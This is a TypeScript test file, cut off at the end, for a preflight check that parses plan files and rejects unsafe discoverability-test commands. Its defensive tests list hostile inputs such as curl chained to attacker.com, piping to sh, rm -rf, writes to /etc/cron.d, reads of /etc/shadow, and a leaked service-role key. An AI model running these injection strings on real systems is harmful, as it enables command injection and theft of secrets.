import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import {
  classifyDiscoverabilityResult,
  extractObservabilityBlock,
  matchExpected,
  parseCommand,
  parseExpected,
  parseKind,
  parseMarker,
  sshRejectReason,
  substRejectReason,
  type ExecResult,
  type Executor,
} from "./lib/discoverability-test-parser";

const FIXTURES_DIR = join(import.meta.dir, "fixtures", "preflight-check-10");
const SKILL_PATH = join(
  import.meta.dir,
  "..",
  "skills",
  "preflight",
  "SKILL.md",
);

const fx = (name: string) =>
  readFileSync(join(FIXTURES_DIR, name), { encoding: "utf8" });

const stubExecutor =
  (rc: number, stdout: string): Executor =>
  async () =>
    ({ rc, stdout }) as ExecResult;

describe("preflight Check 10 — SKILL.md prose invariants", () => {
  const skill = readFileSync(SKILL_PATH, { encoding: "utf8" });

  test("Check 10 heading exists", () => {
    expect(skill).toMatch(/^### Check 10: Discoverability Test Execution/m);
  });

  test("SENSITIVE_PATH_RE literal appears ≥2 times (Check 6 + Check 10)", () => {
    const matches = skill.match(
      /SENSITIVE_PATH_RE='\^\(apps\/web-platform/g,
    );
    expect(matches).not.toBeNull();
    expect(matches!.length).toBeGreaterThanOrEqual(2);
  });

  test("triple-SSOT: preflight + deepen-plan literals are byte-identical (whitespace-normalized)", () => {
    const deepenPath = join(
      import.meta.dir,
      "..",
      "skills",
      "deepen-plan",
      "SKILL.md",
    );
    const deepen = readFileSync(deepenPath, { encoding: "utf8" });
    const extract = (src: string): string | null => {
      const m = src.match(
        /SENSITIVE_PATH_RE='\^\(apps\/web-platform[^\n]+/,
      );
      return m ? m[0].replace(/^[\s]+/, "") : null;
    };
    const a = extract(skill);
    const b = extract(deepen);
    expect(a).not.toBeNull();
    expect(b).not.toBeNull();
    expect(a).toBe(b);
  });

  test("Shared Plan-File Resolution sub-section referenced from ≥3 places (header + 2 callers)", () => {
    const count = (skill.match(/Shared Plan-File Resolution/g) ?? []).length;
    expect(count).toBeGreaterThanOrEqual(3);
  });

  test("Check 10 explicitly rejects ssh commands (canonical reject regex form)", () => {
    expect(skill).toMatch(/\(\^\|\[\[:space:\]\]\|\/\)ssh\(\[\[:space:\]\]\|\$\)/);
  });

  test("Both Form A and Form B parser shapes are documented inside Check 10", () => {
    const check10Block = skill.match(
      /### Check 10:[\s\S]*?(?=^### Check \d+|^## )/m,
    );
    expect(check10Block).not.toBeNull();
    expect(check10Block![0]).toMatch(/Form A/);
    expect(check10Block![0]).toMatch(/Form B/);
  });

  test("decision matrix exists with exactly one PASS terminal", () => {
    const check10Block = skill.match(
      /### Check 10:[\s\S]*?(?=^### Check \d+|^## )/m,
    );
    expect(check10Block).not.toBeNull();
    const rows = check10Block![0].match(/^\|\s*\d+\s*\|/gm) ?? [];
    expect(rows.length).toBeGreaterThanOrEqual(12);
    const passRows =
      check10Block![0].match(/^\|\s*\d+\s*\|[^\n]*\*\*PASS\*\*/gm) ?? [];
    expect(passRows.length).toBe(1);
  });

  test("Fast-path SKIP table includes Check 10 row", () => {
    expect(skill).toMatch(
      /\|\s*10[^|]*Discoverability[^|]*\|[^|]*sensitive-path/i,
    );
  });

  test("Phase 2 aggregate table includes Discoverability Test Execution row", () => {
    expect(skill).toMatch(/\|\s*Discoverability Test Execution\s*\|/);
  });

  // ---- `discoverability_test.kind` runtime invariants (the bash IS the runtime) ----

  test("Step 10.4b (kind resolution) exists", () => {
    expect(skill).toMatch(/\*\*Step 10\.4b:/);
  });

  test("F2: Step 10.4b sits AFTER the ssh reject and BEFORE the subst reject", () => {
    // The single most dangerous ordering in this feature. If kind resolution
    // moves above the ssh reject, `kind: run-log` + `ssh …` returns SKIP and
    // hr-no-ssh-fallback-in-runbooks is silently defeated.
    const sshReject = skill.indexOf(
      "FAIL: discoverability_test.command contains ssh;",
    );
    const kindStep = skill.indexOf("**Step 10.4b:");
    const substReject = skill.indexOf(
      "FAIL: discoverability_test.command contains shell-active token;",
    );
    expect(sshReject).toBeGreaterThan(-1);
    expect(kindStep).toBeGreaterThan(-1);
    expect(substReject).toBeGreaterThan(-1);
    expect(kindStep).toBeGreaterThan(sshReject);
    expect(substReject).toBeGreaterThan(kindStep);
  });

  test("guardrail 4 shell form excludes planning artifacts (non-vacuity)", () => {
    // Without the two exclusion pathspecs the check is vacuous: the plan that
    // declares the marker is itself in the tree, so `git grep` always matches.
    const check10Block = skill.match(
      /### Check 10:[\s\S]*?(?=^### Check \d+|^## )/m,
    );
    expect(check10Block).not.toBeNull();
    expect(check10Block![0]).toMatch(/git grep[^\n]*-F -- "\$MARKER"/);
    expect(check10Block![0]).toMatch(/':!knowledge-base\/project\/plans'/);
    expect(check10Block![0]).toMatch(/':!knowledge-base\/project\/specs'/);
  });

  test("guardrail 4 does NOT grep preflight-diff-files.txt for the marker", () => {
    // That file holds FILENAMES, not contents — grepping it for a marker can
    // never match, which would make guardrail 4 a permanent FAIL (or, if
    // inverted, a permanent pass).
    const check10Block = skill.match(
      /### Check 10:[\s\S]*?(?=^### Check \d+|^## )/m,
    );
    expect(check10Block![0]).not.toMatch(/\$MARKER[^\n]*preflight-diff-files/);
  });

  test("Step 10.4b documents kind as Form-A-only with the marker charset", () => {
    const check10Block = skill.match(
      /### Check 10:[\s\S]*?(?=^### Check \d+|^## )/m,
    );
    expect(check10Block![0]).toMatch(/Form A/);
    expect(check10Block![0]).toMatch(/\^\[A-Za-z0-9_\]\+\$/);
    expect(check10Block![0]).toMatch(/run-log/);
    expect(check10Block![0]).toMatch(/live-probe/);
  });
});

describe("extractObservabilityBlock", () => {
  test("returns the block when present", () => {
    const body = fx("04-dns-fail.md");
    const block = extractObservabilityBlock(body);
    expect(block).toMatch(/discoverability_test\.command/);
    expect(block).toMatch(/web-platform\.soleur\.ai/);
  });

  test("returns empty string when block absent", () => {
    const body = fx("02-no-observability-block.md");
    expect(extractObservabilityBlock(body)).toBe("");
  });

  test("stops at the next ## heading", () => {
    const body = fx("03-no-command-field.md");
    const block = extractObservabilityBlock(body);
    expect(block).toMatch(/liveness_signal/);
    expect(block).not.toMatch(/Acceptance Criteria/);
  });
});

describe("parseCommand", () => {
  test("Form A — strict YAML inline value", () => {
    const block = `discoverability_test:\n  command: curl -fsS https://x/health\n  expected_output: "200"\n`;
    expect(parseCommand(block)).toBe('curl -fsS https://x/health');
  });

  test("Form A — block scalar via `|`", () => {
    const block = [
      "discoverability_test:",
      "  command: |",
      "    bash -c 'sleep 20'",
      '  expected_output: "done"',
    ].join("\n");
    expect(parseCommand(block)).toMatch(/sleep 20/);
  });

  test("Form B — fenced code block following prose key", () => {
    const block = extractObservabilityBlock(fx("04-dns-fail.md"));
    const cmd = parseCommand(block);
    expect(cmd).toMatch(/curl -fsS/);
    expect(cmd).toMatch(/web-platform\.soleur\.ai/);
  });

  test("returns empty string when command field absent", () => {
    const block = extractObservabilityBlock(fx("03-no-command-field.md"));
    expect(parseCommand(block)).toBe("");
  });
});

describe("parseExpected", () => {
  test("Form A — strict YAML expected_output key", () => {
    const block = `discoverability_test:\n  command: curl -fsS https://x\n  expected_output: "200"\n`;
    expect(parseExpected(block)).toMatch(/200/);
  });

  test("Form B — prose `Expected output:` line", () => {
    const block = extractObservabilityBlock(fx("04-dns-fail.md"));
    const expected = parseExpected(block);
    expect(expected).toMatch(/200/);
    expect(expected).toMatch(/401/);
  });

  test("Form B — bold-wrapped `**Expected output:**` line", () => {
    const block = [
      "## Observability",
      "",
      "- **discoverability_test.command:**",
      "  ```bash",
      "  curl -fsS https://app.soleur.ai/api/inngest",
      "  ```",
      "  **Expected output:** `200`",
    ].join("\n");
    expect(parseExpected(block)).toMatch(/200/);
  });
});

describe("matchExpected", () => {
  test("single value substring match", () => {
    expect(matchExpected("200", "200\n")).toBe(true);
    expect(matchExpected("200", "404\n")).toBe(false);
  });

  test("list match (or-joined)", () => {
    expect(matchExpected("200 or 401", "401\n")).toBe(true);
    expect(matchExpected("200 or 401", "503\n")).toBe(false);
  });

  test("list match (comma-joined)", () => {
    expect(matchExpected("200, 401", "200")).toBe(true);
    expect(matchExpected("200, 401", "302")).toBe(false);
  });

  test("normalizes trailing newline before comparing", () => {
    expect(matchExpected("200", "200\n")).toBe(true);
  });

  test("rejects empty stdout against non-empty expected", () => {
    expect(matchExpected("200", "")).toBe(false);
  });

  test("short-token guard: expected '0' does NOT match 500/404/200/302", () => {
    // Without the guard, "0" would substring-match every HTTP code containing
    // a 0 digit, silently disabling the gate. Short tokens require exact match.
    expect(matchExpected("0", "500\n")).toBe(false);
    expect(matchExpected("0", "404")).toBe(false);
    expect(matchExpected("0", "200")).toBe(false);
    expect(matchExpected("0", "302")).toBe(false);
    // Exact match still passes.
    expect(matchExpected("0", "0\n")).toBe(true);
  });
});

describe("classifyDiscoverabilityResult — live-probe decision states", () => {
  test("Row 1: no plan file → SKIP", async () => {
    const result = await classifyDiscoverabilityResult({
      planPath: "",
      planBody: "",
      prBody: fx("01-no-plan-link.md"),
      runner: stubExecutor(0, ""),
    });
    expect(result.result).toBe("SKIP");
    expect(result.reason).toMatch(/no plan|plan.*not (found|linked)/i);
  });

  test("Row 2: plan exists, no ## Observability → FAIL", async () => {
    const planBody = fx("02-no-observability-block.md");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/02-no-observability-block.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/02-no-observability-block.md",
      runner: stubExecutor(0, ""),
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/Observability/);
  });

  test("Row 3: block exists, no discoverability_test.command → FAIL", async () => {
    const planBody = fx("03-no-command-field.md");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/03-no-command-field.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/03-no-command-field.md",
      runner: stubExecutor(0, ""),
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/discoverability_test\.command|command/);
  });

  test("Row 4: DNS failure (rc=6) → FAIL", async () => {
    const planBody = fx("04-dns-fail.md");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/04-dns-fail.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/04-dns-fail.md",
      runner: stubExecutor(6, ""),
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/DNS|resolve|hostname/i);
  });

  test("Row 5: timeout (rc=124) → FAIL", async () => {
    const planBody = fx("05-timeout.md");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/05-timeout.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/05-timeout.md",
      runner: stubExecutor(124, ""),
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/timeout|timed out/i);
  });

  test("Row 6: output mismatch → FAIL", async () => {
    const planBody = fx("06-mismatch.md");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/06-mismatch.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/06-mismatch.md",
      runner: stubExecutor(0, "503\n"),
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/mismatch|expected/i);
  });

  test("Row 7: auth-gated (rc=22, 401 not in expected) → SKIP", async () => {
    const planBody = fx("07-auth-gated.md");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/07-auth-gated.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/07-auth-gated.md",
      runner: stubExecutor(22, "401\n"),
    });
    expect(result.result).toBe("SKIP");
    expect(result.reason).toMatch(/auth|401|creds/i);
  });

  test("Row 8: PASS (rc=0 OR matching expected) — 401 in '200 or 401'", async () => {
    const planBody = fx("08-pass.md");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/08-pass.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/08-pass.md",
      runner: stubExecutor(22, "401\n"),
    });
    expect(result.result).toBe("PASS");
  });
});

describe("classifyDiscoverabilityResult — defense-in-depth rejects", () => {
  test("rejects ssh commands as FAIL", async () => {
    const planBody = [
      "## Observability",
      "",
      "```yaml",
      "discoverability_test:",
      "  command: ssh operator@host 'systemctl status inngest'",
      '  expected_output: "active"',
      "```",
    ].join("\n");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/synthetic-ssh.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/synthetic-ssh.md",
      runner: stubExecutor(0, "active\n"),
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/ssh/i);
  });

  test("rejects shell-chaining tokens (;, &&, ||, |) as FAIL", async () => {
    const cases = [
      "curl https://app.soleur.ai/health; curl https://attacker.com",
      "curl https://app.soleur.ai/health && rm -rf /tmp/x",
      "curl https://app.soleur.ai/health || curl https://attacker.com",
      "curl https://app.soleur.ai/health | sh",
      "curl https://app.soleur.ai/health > /etc/cron.d/x",
      "curl https://app.soleur.ai/health < /etc/shadow",
      "curl https://app.soleur.ai/health &",
    ];
    for (const cmd of cases) {
      const planBody = [
        "## Observability",
        "",
        "```yaml",
        "discoverability_test:",
        `  command: ${cmd}`,
        '  expected_output: "200"',
        "```",
      ].join("\n");
      const result = await classifyDiscoverabilityResult({
        planPath: "fixtures/synthetic-chain.md",
        planBody,
        prBody: "knowledge-base/project/plans/fixtures/synthetic-chain.md",
        runner: stubExecutor(0, "200\n"),
      });
      expect(result.result).toBe("FAIL");
      expect(result.reason).toMatch(/shell-active|substitution|refusing/i);
    }
  });

  test("rejects parameter-expansion ($VAR, ${VAR}) as FAIL", async () => {
    const cases = [
      "curl https://app.soleur.ai/?leak=$TOKEN",
      "curl https://app.soleur.ai/?leak=${SUPABASE_SERVICE_ROLE_KEY}",
    ];
    for (const cmd of cases) {
      const planBody = [
        "## Observability",
        "",
        "```yaml",
        "discoverability_test:",
        `  command: ${cmd}`,
        '  expected_output: "200"',
        "```",
      ].join("\n");
      const result = await classifyDiscoverabilityResult({
        planPath: "fixtures/synthetic-paramexp.md",
        planBody,
        prBody: "knowledge-base/project/plans/fixtures/synthetic-paramexp.md",
        runner: stubExecutor(0, "200\n"),
      });
      expect(result.result).toBe("FAIL");
      expect(result.reason).toMatch(/shell-active|refusing/i);
    }
  });

  test("rejects command-substitution as FAIL", async () => {
    const planBody = [
      "## Observability",
      "",
      "```yaml",
      "discoverability_test:",
      "  command: curl https://$(hostname)/health",
      '  expected_output: "200"',
      "```",
    ].join("\n");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/synthetic-subst.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/synthetic-subst.md",
      runner: stubExecutor(0, "200\n"),
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/substitution|subshell/i);
  });
});

describe("Regression: PR #4148 DNS-fail fixture", () => {
  test("04-dns-fail.md contains the typo'd hostname (regression-snapshot invariant)", () => {
    const body = fx("04-dns-fail.md");
    expect(body).toMatch(/web-platform\.soleur\.ai/);
  });

  test("parser extracts the typo'd hostname from Form B fence (catches comment-strip bug)", () => {
    // PR #4148's plan starts the Form B fence with `# Run from operator…`
    // comment. If the parser does NOT strip leading `#` comments, the first
    // executable line (the curl) becomes the SECOND fence line, and the
    // command extracted is the comment text — production bash would exec a
    // no-op comment instead of the typo'd curl.
    const block = extractObservabilityBlock(fx("04-dns-fail.md"));
    const cmd = parseCommand(block);
    expect(cmd).toMatch(/^curl/);
    expect(cmd).toMatch(/web-platform\.soleur\.ai/);
    expect(cmd).not.toMatch(/^# /);
  });

  test("classifier returns FAIL with DNS reason when stub executor returns (rc=6, stdout='')", async () => {
    const planBody = fx("04-dns-fail.md");
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/04-dns-fail.md",
      planBody,
      prBody: "knowledge-base/project/plans/fixtures/04-dns-fail.md",
      runner: stubExecutor(6, ""),
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/DNS|resolve|hostname/i);
  });
});

// ---------------------------------------------------------------------------
// `discoverability_test.kind` — the seven anti-downgrade guardrails.
//
// Every guardrail below quantifies over a SET, and each test instantiates
// SEVERAL distinct members of that set — a single member is a sample, not a
// proof, and this feature exists precisely to remove guards that cannot fail.
// ---------------------------------------------------------------------------

const yamlPlan = (fields: string[]): string =>
  [
    "## Observability",
    "",
    "```yaml",
    "discoverability_test:",
    ...fields.map((f) => `  ${f}`),
    "```",
  ].join("\n");

const classify = (
  planBody: string,
  opts: { markerLookup?: (m: string) => boolean; rc?: number; out?: string } = {},
) =>
  classifyDiscoverabilityResult({
    planPath: "fixtures/synthetic-kind.md",
    planBody,
    prBody: "knowledge-base/project/plans/fixtures/synthetic-kind.md",
    runner: stubExecutor(opts.rc ?? 0, opts.out ?? "200\n"),
    markerLookup: opts.markerLookup,
  });

describe("parseKind / parseMarker — Form A only, strictly indented", () => {
  test("parses an indented `kind:` for both legal values", () => {
    expect(parseKind(yamlPlan(["kind: run-log"]))).toBe("run-log");
    expect(parseKind(yamlPlan(["kind: live-probe"]))).toBe("live-probe");
  });

  test("returns null when `kind:` is absent (guardrail 1 substrate)", () => {
    expect(parseKind(yamlPlan(["command: curl https://x"]))).toBeNull();
  });

  test("returns null for every unparseable `kind` shape (guardrails 2 + 6)", () => {
    const unparseable = [
      "kind: eventually-consistent", // unknown value
      "kind: runlog", // near-miss spelling
      "kind: RUN-LOG", // wrong case
      "kind: run-log extra", // trailing garbage
      "kind:", // empty value
      "kind : run-log", // space before colon
    ];
    for (const field of unparseable) {
      expect(parseKind(yamlPlan([field]))).toBeNull();
    }
  });

  test("a COLUMN-0 `kind:` does not parse (it is a 6th top-level key, not a sub-field)", () => {
    const body = ["## Observability", "", "```yaml", "kind: run-log", "```"].join(
      "\n",
    );
    expect(parseKind(body)).toBeNull();
  });

  test("parseMarker returns the raw value, malformed included, for the classifier to judge", () => {
    expect(parseMarker(yamlPlan(["marker: SOLEUR_OK_1"]))).toBe("SOLEUR_OK_1");
    expect(parseMarker(yamlPlan(["marker: has-a-dash"]))).toBe("has-a-dash");
    expect(parseMarker(yamlPlan(["command: curl https://x"]))).toBeNull();
  });
});

describe("F2: the SSH reject is split out and runs unconditionally", () => {
  test("sshRejectReason and substRejectReason are independent functions", () => {
    expect(sshRejectReason("ssh host uptime")).toMatch(/ssh/i);
    expect(sshRejectReason("curl https://x | grep Y")).toBeNull();
    expect(substRejectReason("curl https://x | grep Y")).toMatch(
      /shell-active|refusing/i,
    );
    expect(substRejectReason("curl https://x")).toBeNull();
  });

  test("fixture 13: run-log + ssh FAILs (all other guardrails satisfied)", async () => {
    const result = await classify(fx("13-run-log-ssh.md"), {
      markerLookup: () => true,
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/ssh/i);
  });

  test("SSH is rejected across MANY run-log command shapes, not just one", async () => {
    const shapes = [
      "ssh operator@host grep SOLEUR_M /var/log/x.log",
      "/usr/bin/ssh operator@host grep SOLEUR_M /var/log/x.log",
      "timeout 10 ssh host grep SOLEUR_M /var/log/x.log",
      "ssh", // bare, at end-of-string — the `\b` trap this repo already documents
    ];
    for (const cmd of shapes) {
      const result = await classify(
        yamlPlan([
          "kind: run-log",
          "marker: SOLEUR_M",
          `command: ${cmd}`,
          'expected_output: "row"',
        ]),
        { markerLookup: () => true },
      );
      expect(result.result).toBe("FAIL");
      expect(result.reason).toMatch(/ssh/i);
    }
  });

  test("live-probe + ssh still FAILs (the reject did not move under a kind branch)", async () => {
    const result = await classify(
      yamlPlan([
        "kind: live-probe",
        "command: ssh operator@host uptime",
        'expected_output: "up"',
      ]),
    );
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/ssh/i);
  });
});

describe("Guardrail 1 — absent `kind` means live-probe, byte-for-byte as today", () => {
  test("every pre-existing fixture classifies exactly as before the change", async () => {
    // The regression set: each of these fixtures predates `kind` and carries
    // no `kind:` key. Any drift here IS the silent downgrade.
    const cases: Array<[string, number, string, "PASS" | "FAIL" | "SKIP"]> = [
      ["04-dns-fail.md", 6, "", "FAIL"],
      ["05-timeout.md", 124, "", "FAIL"],
      ["06-mismatch.md", 0, "503\n", "FAIL"],
      ["07-auth-gated.md", 22, "401\n", "SKIP"],
      ["08-pass.md", 22, "401\n", "PASS"],
    ];
    for (const [name, rc, out, expected] of cases) {
      const result = await classifyDiscoverabilityResult({
        planPath: `fixtures/${name}`,
        planBody: fx(name),
        prBody: `knowledge-base/project/plans/fixtures/${name}`,
        runner: stubExecutor(rc, out),
      });
      expect(`${name}:${result.result}`).toBe(`${name}:${expected}`);
      expect(result.marker).toBeUndefined();
    }
  });

  test("a kind-less plan still runs the live probe (the runner IS invoked)", async () => {
    let invoked = 0;
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/08-pass.md",
      planBody: fx("08-pass.md"),
      prBody: "knowledge-base/project/plans/fixtures/08-pass.md",
      runner: async () => {
        invoked += 1;
        return { rc: 22, stdout: "401\n" } as ExecResult;
      },
    });
    expect(invoked).toBe(1);
    expect(result.result).toBe("PASS");
  });

  test("explicit `kind: live-probe` is identical to omitting it", async () => {
    const withKind = await classify(
      yamlPlan([
        "kind: live-probe",
        "command: curl -fsS https://app.soleur.ai/health",
        'expected_output: "200"',
      ]),
      { rc: 0, out: "200\n" },
    );
    const without = await classify(
      yamlPlan([
        "command: curl -fsS https://app.soleur.ai/health",
        'expected_output: "200"',
      ]),
      { rc: 0, out: "200\n" },
    );
    expect(withKind).toEqual(without);
    expect(withKind.result).toBe("PASS");
  });

  test("live-probe still rejects shell-active tokens (subst reject is NOT globally removed)", async () => {
    const result = await classify(
      yamlPlan([
        "kind: live-probe",
        "command: curl https://app.soleur.ai/health | sh",
        'expected_output: "200"',
      ]),
    );
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/shell-active|refusing/i);
  });
});

describe("Guardrail 2 + 6 — an unusable `kind` token FAILs, never defaults", () => {
  test("fixture 12: unknown kind value FAILs", async () => {
    const result = await classify(fx("12-unknown-kind.md"));
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/kind/i);
  });

  test("MANY unknown/near-miss kind values all FAIL — none defaults to live-probe", async () => {
    const bad = [
      "eventually-consistent",
      "runlog",
      "RUN-LOG",
      "Run-Log",
      "log",
      "liveprobe",
      "run-log-ish",
    ];
    for (const value of bad) {
      const result = await classify(
        yamlPlan([
          `kind: ${value}`,
          "command: curl -fsS https://app.soleur.ai/health",
          'expected_output: "200"',
        ]),
        { rc: 0, out: "200\n" },
      );
      // Note the live probe WOULD have passed (rc=0, stdout matches). A FAIL
      // here can only come from the kind guardrail.
      expect(`${value}:${result.result}`).toBe(`${value}:FAIL`);
      expect(result.reason).toMatch(/kind/i);
    }
  });

  test("guardrail 6 — fixture 15: a prose `Kind:` in a Form B block FAILs", async () => {
    const result = await classify(fx("15-form-b-kind-token.md"));
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/kind/i);
  });

  test("guardrail 6 — several unparseable prose/decorated `kind` shapes all FAIL", async () => {
    const shapes = [
      "Kind: run-log",
      "**Kind:** run-log",
      "- Kind: run-log",
      "kind : run-log",
      "KIND: run-log",
    ];
    for (const line of shapes) {
      const planBody = [
        "## Observability",
        "",
        "```yaml",
        "discoverability_test:",
        "  command: curl -fsS https://app.soleur.ai/health",
        '  expected_output: "200"',
        "```",
        "",
        line,
      ].join("\n");
      const result = await classify(planBody, { rc: 0, out: "200\n" });
      expect(`${line}:${result.result}`).toBe(`${line}:FAIL`);
      expect(result.reason).toMatch(/kind/i);
    }
  });

  test("a column-0 `kind: run-log` FAILs rather than silently becoming a 6th top-level key", async () => {
    const planBody = [
      "## Observability",
      "",
      "```yaml",
      "kind: run-log",
      "discoverability_test:",
      "  command: curl -fsS https://app.soleur.ai/health",
      '  expected_output: "200"',
      "```",
    ].join("\n");
    const result = await classify(planBody, { rc: 0, out: "200\n" });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/kind/i);
  });
});

describe("Guardrail 3 — `kind: run-log` requires a well-formed `marker:`", () => {
  test("fixture 10: run-log with no marker FAILs", async () => {
    const result = await classify(fx("10-run-log-no-marker.md"), {
      markerLookup: () => true,
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/marker/i);
  });

  test("MANY malformed marker values all FAIL the ^[A-Za-z0-9_]+$ charset", async () => {
    const bad = [
      "has-a-dash",
      "has.a.dot",
      "has/slash",
      "has:colon",
      "lower*star",
      "trailing$",
      '""',
    ];
    for (const value of bad) {
      const result = await classify(
        yamlPlan([
          "kind: run-log",
          `marker: ${value}`,
          `command: gh run view --log | grep ${value}`,
          'expected_output: "row"',
        ]),
        { markerLookup: () => true },
      );
      expect(`${value}:${result.result}`).toBe(`${value}:FAIL`);
      expect(result.reason).toMatch(/marker/i);
    }
  });

  test("well-formed markers across the whole charset are accepted", async () => {
    const good = ["SOLEUR_M", "abc", "A1", "_leading", "MiXeD_123"];
    for (const value of good) {
      const result = await classify(
        yamlPlan([
          "kind: run-log",
          `marker: ${value}`,
          `command: gh run view <run-id> --log | grep ${value}`,
          'expected_output: "row"',
        ]),
        { markerLookup: () => true },
      );
      expect(`${value}:${result.result}`).toBe(`${value}:SKIP`);
      expect(result.marker).toBe(value);
    }
  });
});

describe("Guardrail 4 — the marker must have a real emitter outside planning artifacts", () => {
  test("fixture 11: marker with no emitter FAILs", async () => {
    const result = await classify(fx("11-run-log-marker-absent.md"), {
      markerLookup: () => false,
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/marker/i);
    expect(result.reason).toMatch(/SOLEUR_TEST_MARKER_11_NO_EMITTER/);
  });

  test("fixtures 09 and 11 differ ONLY by the injected lookup — the guardrail is load-bearing", async () => {
    // 09 and 11 are structurally identical; the sole discriminator is whether
    // an emitter exists. If the guardrail were vacuous both would classify the
    // same, which is precisely the defect class this feature removes.
    const nine = await classify(fx("09-run-log-pass.md"), {
      markerLookup: () => true,
    });
    const eleven = await classify(fx("11-run-log-marker-absent.md"), {
      markerLookup: () => false,
    });
    expect(nine.result).toBe("SKIP");
    expect(eleven.result).toBe("FAIL");
  });

  test("the lookup is CONSULTED with the parsed marker, for several markers", async () => {
    for (const marker of ["SOLEUR_A", "SOLEUR_B_2", "zzz"]) {
      const seen: string[] = [];
      await classify(
        yamlPlan([
          "kind: run-log",
          `marker: ${marker}`,
          `command: gh run view <run-id> --log | grep ${marker}`,
          'expected_output: "row"',
        ]),
        {
          markerLookup: (m) => {
            seen.push(m);
            return true;
          },
        },
      );
      expect(seen).toEqual([marker]);
    }
  });

  test("an omitted markerLookup fails CLOSED (never silently satisfied)", async () => {
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/synthetic-kind.md",
      planBody: fx("09-run-log-pass.md"),
      prBody: "knowledge-base/project/plans/fixtures/synthetic-kind.md",
      runner: stubExecutor(0, "200\n"),
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/marker/i);
  });
});

describe("Guardrail 5 — under run-log the command must name the marker", () => {
  test("fixture 14: command lacks the marker → FAIL", async () => {
    const result = await classify(fx("14-run-log-command-lacks-marker.md"), {
      markerLookup: () => true,
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/command/i);
    expect(result.reason).toMatch(/SOLEUR_TEST_MARKER_14/);
  });

  test("MANY unrelated commands all FAIL even with a valid, present marker", async () => {
    const commands = [
      "gh run view <run-id> --log | grep SOMETHING_ELSE",
      "curl -fsS https://app.soleur.ai/health",
      "gh run view <run-id> --log",
      "echo hello",
    ];
    for (const cmd of commands) {
      const result = await classify(
        yamlPlan([
          "kind: run-log",
          "marker: SOLEUR_PRESENT",
          `command: ${cmd}`,
          'expected_output: "row"',
        ]),
        { markerLookup: () => true },
      );
      expect(`${cmd}:${result.result}`).toBe(`${cmd}:FAIL`);
    }
  });

  test("the same command WITH the marker appended is accepted — isolates guardrail 5", async () => {
    const result = await classify(
      yamlPlan([
        "kind: run-log",
        "marker: SOLEUR_PRESENT",
        "command: gh run view <run-id> --log | grep SOLEUR_PRESENT",
        'expected_output: "row"',
      ]),
      { markerLookup: () => true },
    );
    expect(result.result).toBe("SKIP");
  });
});

describe("Guardrail 7 — `marker:` without `kind: run-log` FAILs", () => {
  test("fixture 16: marker with no kind at all → FAIL", async () => {
    const result = await classify(fx("16-marker-without-run-log.md"), {
      markerLookup: () => true,
    });
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/marker/i);
  });

  test("marker + explicit `kind: live-probe` → FAIL", async () => {
    const result = await classify(
      yamlPlan([
        "kind: live-probe",
        "marker: SOLEUR_PRESENT",
        "command: curl -fsS https://app.soleur.ai/health",
        'expected_output: "200"',
      ]),
      { markerLookup: () => true, rc: 0, out: "200\n" },
    );
    // The live probe would otherwise PASS — the FAIL can only be guardrail 7.
    expect(result.result).toBe("FAIL");
    expect(result.reason).toMatch(/marker/i);
  });

  test("several decorated/prose marker shapes all trip guardrail 7", async () => {
    const shapes = ["Marker: SOLEUR_P", "**marker:** SOLEUR_P", "- marker: SOLEUR_P"];
    for (const line of shapes) {
      const planBody = [
        "## Observability",
        "",
        "```yaml",
        "discoverability_test:",
        "  command: curl -fsS https://app.soleur.ai/health",
        '  expected_output: "200"',
        "```",
        "",
        line,
      ].join("\n");
      const result = await classify(planBody, {
        markerLookup: () => true,
        rc: 0,
        out: "200\n",
      });
      expect(`${line}:${result.result}`).toBe(`${line}:FAIL`);
    }
  });
});

describe("run-log SKIP shape — the marker is RECORDED, not merely tolerated", () => {
  test("fixture 09: valid run-log → SKIP naming run-log and the marker", async () => {
    const result = await classify(fx("09-run-log-pass.md"), {
      markerLookup: () => true,
    });
    expect(result.result).toBe("SKIP");
    expect(result.reason).toMatch(/run-log/);
    expect(result.reason).toMatch(/SOLEUR_TEST_MARKER_09/);
    expect(result.marker).toBe("SOLEUR_TEST_MARKER_09");
